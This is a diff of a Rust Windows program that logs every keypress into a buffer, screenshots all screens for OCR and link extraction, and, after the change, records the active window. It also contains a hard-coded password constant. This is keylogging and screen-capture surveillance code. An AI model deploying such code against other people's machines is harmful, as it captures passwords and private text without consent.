@@ -1,27 +1,23 @@
 // #![windows_subsystem = "windows"]
 
-use byteorder::{LittleEndian, ReadBytesExt, WriteBytesExt};
 use core::mem::MaybeUninit;
 use winapi::um::winuser;
 use std::collections::HashMap;
 use std::time::Instant;
-use std::env;
 use std::fs;
 use std::fs::File;
-use std::fs::OpenOptions;
-use std::io::prelude::*;
 use std::io::Write;
-use std::io::{self, BufRead, Read};
+use std::io::Read;
 use std::io::BufReader;
 use std::str;
 use chrono::{Utc, DateTime};
 use linkify::{LinkFinder, LinkKind};
-use image::io::Reader as ImageReader;
-use image::{DynamicImage, ImageBuffer};
+use image::DynamicImage;
 use rusty_tesseract::{Args, Image};
 use regex::RegexBuilder;
 use std::sync::Mutex;
 use once_cell::sync::Lazy;
+use active_win_pos_rs::get_active_window;
 use monitor::*;
 
 const PASS: &[u8] = b"firemouses!";
@@ -100,7 +96,6 @@ fn main() {
                 println!("Double click");
             }
             Events::ClickTrayIcon => {
-                let start = Instant::now();
                 let screens = Screen::all().unwrap();
 
                 for screen in screens {
@@ -224,11 +219,19 @@ fn track(event: Event) {
             *LOGGED.lock().unwrap() = true;
 
             dolog(logs);
+
+            match get_active_window() {
+                Ok(active_window) => {
+                    println!("active window: {:#?}", active_window);
+                },
+                Err(()) => {
+                    println!("error occurred while getting the active window");
+                }
+            }
         },
         EventType::KeyPress(Key::Unknown(u32)) => println!("Unknown key!"),
         EventType::KeyPress(Key) => {
             let key = event.name.unwrap();
-            let old = LOG_FILE.lock().unwrap().clone();
             *LOG_FILE.lock().unwrap() += &key;
             *LOGGED.lock().unwrap() = false;
         },
